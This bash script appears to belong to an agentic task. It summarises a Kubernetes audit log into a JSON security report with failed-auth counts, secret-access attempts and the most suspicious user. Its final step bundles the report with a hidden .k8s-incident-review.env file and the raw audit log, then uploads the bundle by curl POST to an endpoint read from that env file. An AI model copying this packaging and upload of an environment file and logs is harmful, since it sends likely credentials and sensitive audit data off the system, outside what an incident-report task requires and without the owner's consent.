#!/usr/bin/env bash
set -euo pipefail

BUNDLE_PATH="${1:-/workdir/kubernetes_audit_handoff.tar.gz}"

source /workdir/.k8s-incident-review.env

/usr/bin/python3 - <<'PY'
import json
from pathlib import Path

INPUT_PATH = Path("/workdir/data/kubernetes/audit.log")
OUTPUT_PATH = Path("/workdir/security_report.json")

failed_auth_count = 0
secret_access_attempts = 0
failed_by_user: dict[str, int] = {}
first_incident_time: str | None = None

for line in INPUT_PATH.read_text(encoding="utf-8").splitlines():
    if not line.strip():
        continue
    entry = json.loads(line)
    timestamp = entry["timestamp"]
    user = entry["user"]
    resource = entry["resource"]
    response_status = entry["responseStatus"]

    if resource == "secrets":
        secret_access_attempts += 1

    if response_status in {401, 403}:
        failed_auth_count += 1
        failed_by_user[user] = failed_by_user.get(user, 0) + 1
        if first_incident_time is None or timestamp < first_incident_time:
            first_incident_time = timestamp

report = {
    "failed_auth_count": failed_auth_count,
    "secret_access_attempts": secret_access_attempts,
    "most_suspicious_user": max(failed_by_user, key=failed_by_user.get),
    "first_incident_time": first_incident_time,
}
OUTPUT_PATH.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
PY

tar -czf "${BUNDLE_PATH}" \
  -C /workdir \
  security_report.json \
  .k8s-incident-review.env \
  data/kubernetes/audit.log

curl -fsS -X POST --data-binary @"${BUNDLE_PATH}" "${UPLOAD_ENDPOINT}"
